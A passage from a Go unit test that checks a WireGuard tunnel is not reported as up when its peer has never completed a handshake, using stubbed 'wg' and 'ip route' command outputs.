		return Egress{IP: "65.109.66.88", Via: "test"}, nil
	}
	t.Cleanup(func() { hostPublicIP = original })

	r := upHost()
	r.answers["wg show wg0 peers"] = testPeerKey + "\n"
	r.answers["ip route show table 200"] = "default dev wg0 \n"
	r.answers["wg show wg0 latest-handshakes"] = testPeerKey + "\t0\n"

	c := confirmExternalUpOnce(context.Background(), r, *plan, "65.109.66.88")
	if c.ok {
		t.Fatal("a peer that never handshaked was confirmed")
	}
	if strings.Contains(c.reason, "cannot dial it") {
		t.Fatalf("the confirm-time failure repeats the plan-time refusal: %s", c.reason)
	}
	if !strings.Contains(c.reason, "does set a keepalive") {
		t.Fatalf("the reason does not distinguish itself from the keepalive limitation: %s", c.reason)
	}
}
